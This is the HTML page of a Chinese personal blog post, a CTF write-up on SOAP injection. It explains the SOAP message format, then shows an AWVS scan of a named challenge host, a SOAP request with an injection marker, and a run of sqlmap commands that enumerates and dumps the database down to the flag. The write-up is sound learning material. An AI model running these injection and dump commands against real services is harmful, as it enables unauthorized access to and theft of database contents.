@@ -1,0 +1,436 @@
+<head>
+<script src="https://cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css">
+<script src="https://cdn.jsdelivr.net/gh/stevenjoezhang/live2d-widget/autoload.js"></script>
+</head>
+
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+<head>
+    <!--Setting-->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta name="renderer" content="webkit|ie-comp|ie-stand">
+    <meta name="apple-mobile-web-app-capable" content="ggy的个人博客">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no,email=no,adress=no">
+    <meta name="browsermode" content="application">
+    <meta name="screen-orientation" content="portrait">
+    <meta name="theme-version" content="1.2.3">
+    <meta name="root" content="/">
+    <link rel="dns-prefetch" href="https://ggyggy666.github.io">
+    <!--SEO-->
+
+<meta name="keywords" content="SOAP注入" />
+
+
+<meta name="description" content="经过昨晚以及今天下午的研究，我终于学会了如何挖SOAP注入并且成功拿到flag。太不容易了！
+
+网上关于这种注入的方式的文章讲解真的太少了！而且讲得不是太清楚（或许是我太菜了），导致我昨晚研究了..." />
+
+
+<meta name="robots" content="all" />
+<meta name="google" content="all" />
+<meta name="googlebot" content="all" />
+<meta name="verify" content="all" />
+    <!--Title-->
+
+<title>
+    
+    SOAP注入 |
+    
+    ggy的个人博客
+</title>
+
+<link rel="alternate" href="/atom.xml" title="ggy的个人博客" type="application/atom+xml">
+
+
+<link rel="icon" href="/favicon.ico">
+
+    
+
+
+<link rel="stylesheet" href="/css/bootstrap.min.css?rev=3.3.7.css">
+<link rel="stylesheet" href="/css/font-awesome.min.css?rev=4.7.0.css">
+<link rel="stylesheet" href="/css/style.css?rev=@@hash.css">
+
+    
+<div class="hide">
+    <script type="text/javascript">
+    var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");
+    document.write(unescape("%3Cspan class='cnzz_stat_icon_1263868967 hide' %3E%3Cscript%20src%3D%22https%3A%2F%2Fs95.cnzz.com%2Fz_stat.php%3Fweb_id%3D1272564536%22%3E%3C%2Fscript%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s19.cnzz.com/z_stat.php%3Fid%3D1263868967%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
+    </script>
+</div>
+
+
+
+
+    
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<!--[if lte IE 8]>
+<style>
+    html{ font-size: 1em }
+</style>
+<![endif]-->
+<!--[if lte IE 9]>
+<div style="ie">你使用的浏览器版本过低，为了你更好的阅读体验，请更新浏览器的版本或者使用其他现代浏览器，比如Chrome、Firefox、Safari等。</div>
+<![endif]-->
+<body>
+    <header class="main-header"  style="background-image:url(
+    https://pic.downk.cc/item/5e3816b82fb38b8c3c8791f9.jpg)"
+     >
+    <div class="main-header-box">
+        <a class="header-avatar" href="/" title='ggy'>
+            <img src="/img/avatar.jpg" alt="logo头像" class="img-responsive center-block">
+        </a>
+        <div class="branding">
+            <!--<h2 class="text-hide">Snippet主题,从未如此简单有趣</h2>-->
+            
+            <h2>
+                欢迎来到ggy的个人网站
+            </h2>
+            
+        </div>
+    </div>
+</header>
+    <nav class="main-navigation">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="navbar-header"><span class="nav-toggle-button collapsed pull-right" data-toggle="collapse" data-target="#main-menu" id="mnav">
+                        <span class="sr-only"></span>
+                        <i class="fa fa-bars"></i>
+                    </span>
+                    <a class="navbar-brand" href="https://ggyggy666.github.io">
+                        ggy的个人博客</a>
+                </div>
+                <div class="collapse navbar-collapse" id="main-menu">
+                    <ul class="menu">
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/"><i class="fa "></i>
+                                首页</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/categories/web安全/"><i class="fa "></i>
+                                web安全</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/categories/python工具/"><i class="fa "></i>
+                                python工具</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/categories/密码学/"><i class="fa "></i>
+                                密码学</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/archives/"><i class="fa "></i>
+                                时间轴</a>
+                        </li>
+                        
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</nav>
+    <section class="content-wrap">
+        <div class="container">
+            <div class="row">
+                <main class="col-md-8 main-content m-post">
+                    <p id="process"></p>
+<article class="post">
+    <div class="post-head">
+        <h1 id="SOAP注入">
+            
+            SOAP注入
+            
+        </h1>
+        <div class="post-meta">
+    
+    <span class="categories-meta fa-wrap">
+        <i class="fa fa-folder-open-o"></i>
+        <a class="category-link" href="/categories/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a>
+    </span>
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-tags"></i>
+        <span class="tags-meta">
+            
+            <a class="tag-link" href="/tags/SOAP%E6%B3%A8%E5%85%A5/" rel="tag">SOAP注入</a>
+            
+        </span>
+    </span>
+    
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-clock-o"></i>
+        <span class="date-meta">
+            2020/03/27</span>
+    </span>
+    
+    <span class="fa-wrap">
+        <i class="fa fa-eye"></i>
+        <span id="busuanzi_value_page_pv"></span>
+    </span>
+    
+    
+</div>
+        
+        
+        <p class="fa fa-exclamation-triangle warning">
+            本文于<strong>
+                350</strong>
+            天之前发表，文中内容可能已经过时。
+        </p>
+        
+    </div>
+    
+    <div class="post-body post-content">
+        <p>经过昨晚以及今天下午的研究，我终于学会了如何挖SOAP注入并且成功拿到flag。太不容易了！</p>
+<a id="more"></a>
+<p>网上关于这种注入的方式的文章讲解真的太少了！而且讲得不是太清楚（或许是我太菜了），导致我昨晚研究了一晚都没有什么收获。迫不得已去公众号直接搜，没想到有一篇文章讲的不错，让我瞬间明白怎么利用了。<a href="https://mp.weixin.qq.com/s/6k4O4prW8kAuXdpwNGm-yw" target="_blank" rel="noopener">链接在这</a></p>
+<h1 id="SOAP协议"><a href="#SOAP协议" class="headerlink" title="SOAP协议"></a>SOAP协议</h1><p>SOAP是WebService的三要素之一，关于WebService在我之前的文章有讲到：<a href="http://ggy.816ym.com/2020/02/28/Web%E4%B8%9A%E5%8A%A1-%E4%B8%9A%E5%8A%A1%E6%8E%A5%E5%8F%A3%E8%B0%83%E7%94%A8%E6%A8%A1%E5%9D%97/" target="_blank" rel="noopener">链接</a><br>SOAP（Simple Object Access Protocol)，简单对象访问协议，是一个可以在不同操作系统上运行的不同语言编写的应用程序之间进行传输通信的协议。它基于HTTP协议传输，传输文本格式是XML。</p>
+<h2 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h2><p>它包括四个部分：</p>
+<ul>
+<li>封装：定义了一个框架，描述了消息中的内容是什么，谁应当处理它，它是可选的还是必须的。</li>
+<li>编码规则：定义了一种序列化机制，用于交换应用程序定义的数据类型的实例。</li>
+<li>RPC表示：定义用于表示远程过程调用和应答的协定。</li>
+<li>SOAP绑定：约定使用底层传输协议来完成节点间交换SOAP封装。</li>
+</ul>
+<h2 id="文档消息结构"><a href="#文档消息结构" class="headerlink" title="文档消息结构"></a>文档消息结构</h2><ul>
+<li>Envelope: 将该XML文档标识为一条SOAP消息。</li>
+<li>Header：包含头部信息。</li>
+<li>Body：包含所有调用和响应信息。</li>
+<li>Fault：提供处理所发生的错误的信息。</li>
+</ul>
+<p>格式如下：</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;soap:Envelope
+    xmlns:soap=&quot;http://xxx/soap-envelope&quot;
+    soap:encodingStyle=&quot;http://xxx/soap-encoding&quot;&gt;
+
+&lt;soap:Header&gt;
+&lt;/soap:Header&gt;
+
+&lt;soap:Body&gt;
+    &lt;soap:Fault&gt;
+    &lt;/soap:Fault&gt;
+&lt;/soap:Body&gt;
+
+&lt;/soap:Envelope&gt;</code></pre><p>必须使用XML编码，Envelope、Encoding命名空间，不能包含DTD（外部实体）引用，不包含XML处理指令。</p>
+<h1 id="一道CTF题目"><a href="#一道CTF题目" class="headerlink" title="一道CTF题目"></a>一道CTF题目</h1><p>链接：<a href="http://www.whalwl.top:8018" target="_blank" rel="noopener">http://www.whalwl.top:8018</a><br>打开后初始化，点击进入到一个XML文档页面，可以看到URL链接是：<br><a href="http://www.whalwl.top:8018/ws_soap.php?wsdl" target="_blank" rel="noopener">http://www.whalwl.top:8018/ws_soap.php?wsdl</a><br>有?wsdl，可以判定是SOAP类型的，可能存在漏洞。抓包发现没有传递什么参数，在burp里挖是不太可能了（反正我不懂）。根据网上的教程，直接把这个链接丢到AWVS13里面去爬、探测。</p>
+<h2 id="AWVS操作步骤"><a href="#AWVS操作步骤" class="headerlink" title="AWVS操作步骤"></a>AWVS操作步骤</h2><p>打开<a href="https://localhost:3443" target="_blank" rel="noopener">https://localhost:3443</a>, 点击Targets-&gt;Add Target-&gt;填入要爬的URL并随便填写备注-&gt;Save-&gt;默认配置，直接点Scan-&gt;开始扫描。<br>最后扫出来的结果可以在Vulnerabilities里查看。</p>
+<p><img src="https://pic.downk.cc/item/5e7dc4cf504f4bcb045fbe70.jpg" alt></p>
+<h2 id="实战操作"><a href="#实战操作" class="headerlink" title="实战操作"></a>实战操作</h2><p>可以看到出现了SQL注入，还是盲注类型。点击该漏洞，右边出现了该漏洞的详细信息，往下拉到HTTP Request。</p>
+<p><img src="https://pic.downk.cc/item/5e7dc510504f4bcb046000d6.jpg" alt></p>
+<p>点左上角的复制，将整个请求包复制下来，在桌面新建一个txt文件，命名为soap.txt。打开，粘贴，在title那里加一个<code>*</code>（加<code>*</code>是让sqlmap探测这个位置）,保存。打开SQLmap，开始注入。</p>
+<p>需要解释一下这个请求包后面的xml格式的内容：  </p>
+<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;soap:Envelope xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot;&gt;
+    &lt;soap:Header /&gt;
+    &lt;soap:Body&gt;
+        &lt;tns:get_tickets_stock&gt;
+            &lt;title&gt;*&lt;/title&gt;
+        &lt;/tns:get_tickets_stock&gt;
+    &lt;/soap:Body&gt;
+&lt;/soap:Envelope&gt;</code></pre><p>有Envelope,Header,Body，没有Fault。为什么这个请求包会这样呢，还需要打开 <a href="http://www.whalwl.top:8018/ws_soap.php?wsdl" target="_blank" rel="noopener">http://www.whalwl.top:8018/ws_soap.php?wsdl</a> 分析里面的xml文本内容。</p>
+<p><img src="https://pic.downk.cc/item/5e7dc92b504f4bcb04633100.jpg" alt></p>
+<ol>
+<li>首先在这个文档里面找到xsd:string类型的那个标签，发现它在一个name为title里面，那么说明这里就是注入的地方，因此请求包那才在<title></title>中间加*。</li>
+<li>然后找到这个titlt所在的标签，是message，name为：get_tickets_stockRequest 。</li>
+<li>通过这个name找到调用这个message的地方，发现它在一个input标签中。</li>
+<li>发现它在一个operation标签里，并且这个标签的name为：get_tickets_stock 。因此得到整个流程：<br>在body里面，首先通过<a href="tns:get_tickets_stock">tns:get_tickets_stock</a>找到operation标签，运行标签里的输入框input，就开始调用message，通过message=”tns:get_tickets_stockRequest”找到对应的message标签，最后运行到title那个标签。</li>
+</ol>
+<pre><code>&lt;tns:get_tickets_stock&gt;
+    &lt;title&gt;*&lt;/title&gt;
+&lt;/tns:get_tickets_stock&gt;</code></pre><p>请求包中的这两句就是这么来的。</p>
+<h3 id="爆数据库名"><a href="#爆数据库名" class="headerlink" title="爆数据库名"></a>爆数据库名</h3><pre><code>python sqlmap.py -r F:\\360MoveData\\Users\\ASUS\\Desktop\\soap.txt --batch --dbs</code></pre><p>使用-r参数读取文件内容进行操作，后面跟的是soap.txt所在的绝对路径，–batch是在遇到选择时默认选yes，–dbs就是爆数据库名。</p>
+<p><img src="https://pic.downk.cc/item/5e7dc678504f4bcb046112d9.jpg" alt></p>
+<p>爆出来了数据库名，我们要的flag在whalwl这个数据库名中。</p>
+<h3 id="爆数据库表名"><a href="#爆数据库表名" class="headerlink" title="爆数据库表名"></a>爆数据库表名</h3><pre><code>python sqlmap.py -r F:\\360MoveData\\Users\\ASUS\\Desktop\\soap.txt --batch --tables -D &quot;whalwl&quot;</code></pre><p><img src="https://pic.downk.cc/item/5e7dc6cf504f4bcb046153c7.jpg" alt></p>
+<h3 id="爆数据库列名"><a href="#爆数据库列名" class="headerlink" title="爆数据库列名"></a>爆数据库列名</h3><pre><code>python sqlmap.py -r F:\\360MoveData\\Users\\ASUS\\Desktop\\soap.txt --batch --columns -D &quot;whalwl&quot; -T &quot;this_flag&quot;</code></pre><p><img src="https://pic.downk.cc/item/5e7dc70d504f4bcb04618386.jpg" alt></p>
+<h3 id="爆flag内容"><a href="#爆flag内容" class="headerlink" title="爆flag内容"></a>爆flag内容</h3><pre><code>python sqlmap.py -r F:\\360MoveData\\Users\\ASUS\\Desktop\\soap.txt --batch --dump -D &quot;whalwl&quot; -T &quot;this_flag&quot; -C &quot;flag&quot;</code></pre><p><img src="https://pic.downk.cc/item/5e7dc738504f4bcb0461a5e9.jpg" alt></p>
+<p>成功拿到flag了！不容易啊。需要注意的是，这种方式使用了AWVS扫描+sqlmap盲注，发包频繁，小心使用，别把人家网站整挂了…</p>
+
+    </div>
+    
+    <div class="reward" ontouchstart>
+    <div class="reward-wrap">赏
+        <div class="reward-box">
+            
+            <span class="reward-type">
+                <img class="alipay" src="/img/alipay.jpg"><b>支付宝打赏</b>
+            </span>
+            
+            
+            <span class="reward-type">
+                <img class="wechat" src="/img/wechat.jpg"><b>微信打赏</b>
+            </span>
+            
+        </div>
+    </div>
+    <p class="reward-tip">
+        赞赏是不耍流氓的鼓励
+    </p>
+</div>
+    
+    <div class="post-footer">
+        <div>
+            
+            转载声明：
+            商业转载请联系作者获得授权,非商业转载请注明出处 © <a href="ggy.44pp.vip" target="_blank">ggy</a>
+            
+            
+        </div>
+        <div>
+            
+        </div>
+    </div>
+</article>
+<div class="article-nav prev-next-wrap clearfix">
+    
+    <a href="/2020/03/31/%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E9%A2%98%E7%9B%AE%E6%94%B6%E8%8E%B7%E7%9A%84%E5%B0%8F%E7%9F%A5%E8%AF%86/" class="pre-post btn btn-default" title='从SQL注入题目收获的小知识'>
+        <i class="fa fa-angle-left fa-fw"></i><span class="hidden-lg">上一篇</span>
+        <span class="hidden-xs">
+            从SQL注入题目收获的小知识</span>
+    </a>
+    
+    
+    <a href="/2020/03/26/DNSLog%E5%9E%8BSQL%E6%B3%A8%E5%85%A5/" class="next-post btn btn-default" title='DNSLog型SQL注入'>
+        <span class="hidden-lg">下一篇</span>
+        <span class="hidden-xs">
+            DNSLog型SQL注入</span><i class="fa fa-angle-right fa-fw"></i>
+    </a>
+    
+</div>
+
+<div id="comments">
+    
+<div id="lv-container" data-id="city" data-uid="MTAyMC80ODM1Ni8yNDg1MA==">
+    <script type="text/javascript">
+    (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+    })(document, 'script');
+    </script>
+</div>
+
+</div>
+
+                </main>
+                
+                    <aside id="article-toc" role="navigation" class="col-md-4">
+    <div class="widget">
+        <h3 class="title">
+            文章目录
+        </h3>
+        
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SOAP协议"><span class="toc-text">SOAP协议</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#组成"><span class="toc-text">组成</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#文档消息结构"><span class="toc-text">文档消息结构</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#一道CTF题目"><span class="toc-text">一道CTF题目</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#AWVS操作步骤"><span class="toc-text">AWVS操作步骤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#实战操作"><span class="toc-text">实战操作</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#爆数据库名"><span class="toc-text">爆数据库名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#爆数据库表名"><span class="toc-text">爆数据库表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#爆数据库列名"><span class="toc-text">爆数据库列名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#爆flag内容"><span class="toc-text">爆flag内容</span></a></li></ol></li></ol></li></ol>
+        
+    </div>
+</aside>
+                
+            </div>
+        </div>
+    </section>
+    <footer class="main-footer">
+    <div class="container">
+        <div class="row">
+        </div>
+    </div>
+</footer>
+<a id="back-to-top" class="icon-btn hide">
+    <i class="fa fa-chevron-up"></i>
+</a>
+    <div class="copyright">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="busuanzi">
+    
+    访问量:
+    <strong id="busuanzi_value_site_pv">
+        <i class="fa fa-spinner fa-spin"></i>
+    </strong>
+    &nbsp; | &nbsp;
+    访客数:
+    <strong id="busuanzi_value_site_uv">
+        <i class="fa fa-spinner fa-spin"></i>
+    </strong>
+    
+</div>
+            </div>
+            <div class="col-sm-12">
+                <span>Copyright &copy;
+                    2020
+                    
+                </span> |
+                <span>
+                    Powered by <a href="//hexo.io" class="copyright-links" target="_blank" rel="nofollow">Hexo</a>
+                </span> |
+                <span>
+                    Theme by <a href="//github.com/shenliyang/hexo-theme-snippet.git" class="copyright-links" target="_blank" rel="nofollow">Snippet</a>
+                </span>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<script src="/assets/tagcanvas.min.js?rev=2.9.js"></script>
+
+<script>
+var tagOption = {
+    textColour: '#444', // 字体颜色
+    outlineMethod: 'block', // 选中模式
+    outlineColour: '#FFDAB9', // 选中模式的颜色
+    interval: 30 || 30, // 动画帧之间的时间间隔，值越大，转动幅度越大
+    textHeight: 13,
+    outlineRadius: 3,
+    freezeActive: true || '', // 选中的标签是否继续滚动
+    frontSelect: true || '', // 不选标签云后部的标签
+    initial: [0.1, -0.1],
+    depth: 0.5,
+    decel: 0.95,
+    maxSpeed: 0.03,
+    reverse: true || '', // 是否反向触发
+    fadeIn: 500, // 进入动画时间
+    wheelZoom: false || '' // 是否启用鼠标滚轮
+}
+TagCanvas.Start('tag-cloud-3d', '', tagOption);
+</script>
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+<script src="/js/app.js?rev=@@hash.js"></script>
+
+
+<!-- 雪花特效 -->
+<script type="text/javascript" src="http://libs.baidu.com/jquery/1.8.3/jquery.js"></script>
+<script type="text/javascript" src="http://libs.baidu.com/jquery/1.8.3/jquery.min.js"></script>
+<script type="text/javascript" src="\js\snow.js"></script>
+
+<canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+<script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+<script type="text/javascript" src="/js/fireworks.js"></script>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"live2d-widget-model-haruto"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
